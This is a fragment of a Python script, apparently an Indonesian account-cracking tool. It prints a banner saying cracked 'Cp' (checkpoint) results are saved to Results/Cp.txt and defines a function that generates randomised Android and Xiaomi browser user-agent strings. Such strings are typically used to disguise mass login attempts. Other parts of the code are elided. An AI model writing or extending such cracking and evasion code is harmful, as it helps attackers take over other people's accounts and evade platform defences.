...
[bold white]Hasil Crack[bold red] Cp[bold white] Tersimpan Di :[bold red] Results/Cp.txt""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Results Crack) [bold green]<[bold yellow]<[bold red]"))
    ...
    def realme_useragent(self, total):
        for _ in range(total):
            ...
            self.android_model = random.choice(['Qin 2', 'ASUS_I005DA', 'Redmi Note9 Pro Max', 'RMX2193', 'Redmi Note 8', 'Redmi Note 7', 'Redmi note 6', 'Redmi Note 5'])
            self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{} Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.6.2-go'.format(self.android_version, self.android_model, self.build, self.browser_version))
